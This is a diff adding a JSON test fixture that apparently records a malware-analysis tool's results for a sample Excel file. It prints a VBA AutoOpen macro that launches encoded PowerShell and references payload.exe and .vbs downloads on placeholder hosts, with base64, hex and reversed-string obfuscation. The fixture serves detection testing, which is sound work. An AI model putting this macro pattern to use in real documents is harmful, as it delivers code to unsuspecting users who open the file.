@@ -1,0 +1,202 @@
+{
+  "form": 1,
+  "observables": {
+    "file:3e8d20121959017338e69dccb63da2778fc168aeaaddb1dad0552504dcbf5d17": {
+      "detections": {},
+      "directives": {
+        "crawl_extracted_urls": true,
+        "extract_urls": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_excel_bad_biff_formula.xls.xlmdeobfuscator/xlmdeobfuscator.stdout": {
+          "type=script.macro.xlm": true
+        },
+        "vba_excel_bad_biff_formula.xls.xlmdeobfuscator/xlmdeobfuscatorextractcells.stdout": {
+          "type=script.macro.xlm": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {}
+    },
+    "file:80f131942b7e835716a465a83c954fb906773bd9a42cb440366b7f0d65f36f43": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {},
+      "paths": {
+        "vba_excel_bad_biff_formula.xls": {
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": true,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/vnd.ms-excel",
+            "type": "CDFV2 Microsoft Excel"
+          },
+          "summary": "File Type Analysis: CDFV2 Microsoft Excel (application/vnd.ms-excel) (ms office document) (ole compound file)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {
+              "autoexec": 1,
+              "base64 string": 1,
+              "hex string": 1,
+              "ioc": 1,
+              "suspicious": 1
+            },
+            "macros": [
+              {
+                "file_name": "<root>/files/vba_excel_bad_biff_formula.xls",
+                "local_path": "e058931096278bcc4a93d131d179150561912d4070407e7daceb5e1117789b8c",
+                "stream_path": "_VBA_PROJECT_CUR/VBA/Module1",
+                "vba_code": "Sub AutoOpen()\n  x = CreateObject(\"WScript.Shell\").Run(\"powershell -enc 4D5A9000 aHR0cDovL2V4YW1wbGUuY29tL3g=\")\n  y = \"http://example.com/payload.exe\" & \"http://192.0.2.1:8080/a b.vbs\"\n  z = \"VGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4=\" & \"68747470733a2f2f6578616d706c652e6f72672f\"\n  a = StrReverse(\"6578652e\") & Chr(65) & \"ab\" & vbHide & \"\b\"\n  Button1_Click: Workbook_Open\n  .Variables(\"a\")\nEnd Sub",
+                "vba_filename": "Module1.bas"
+              },
+              {
+                "file_name": "xlm_macro",
+                "local_path": "ac6a754e37076067c8ea2ff05b9899f1f171b09e5a07cb15e1f7618da6d2d006",
+                "stream_path": "xlm_macro",
+                "vba_code": "' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - \u0000Sheet\n' 0085     14 BOUNDSHEET : Sheet Information - Excel 4.0 macro sheet, visible - \u0000Macro\n' 0018     22 LABEL : Cell Value, String Constant - built-in-name 0 ? len=3 *UNKNOWN TOKEN* 0x0000 *INCOMPLETE FORMULA PARSING* Remaining, unparsed expression: b'\\x00\\x01'\n' Sheet,Reference,Formula,Value\n' \"\",A1,1,\"\"",
+                "vba_filename": "xlm_macro.txt"
+              }
+            ],
+            "type": "OLE"
+          },
+          "summary": "OLEVBA Analysis: (2 macro files) (OLE) | autoexec=1, suspicious=1, ioc=1, hex string=1, base64 string=1",
+          "tags": {}
+        },
+        "xlmdeobfuscator": {
+          "details": {
+            "cell_count": 0
+          },
+          "summary": "XLMMacroDeobfuscator Analysis - analyzed 0 cells",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "ole": true,
+        "olevba": true,
+        "xlm4:error": true,
+        "xlm4:no_cells": true
+      }
+    },
+    "file:ac6a754e37076067c8ea2ff05b9899f1f171b09e5a07cb15e1f7618da6d2d006": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_excel_bad_biff_formula.xls.olevba/macro_1.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:80f131942b7e835716a465a83c954fb906773bd9a42cb440366b7f0d65f36f43",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:e058931096278bcc4a93d131d179150561912d4070407e7daceb5e1117789b8c": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "vba_excel_bad_biff_formula.xls.olevba/macro_0.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:80f131942b7e835716a465a83c954fb906773bd9a42cb440366b7f0d65f36f43",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with overstriking"
+          },
+          "summary": "File Type Analysis: ASCII text, with overstriking (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    }
+  }
+}
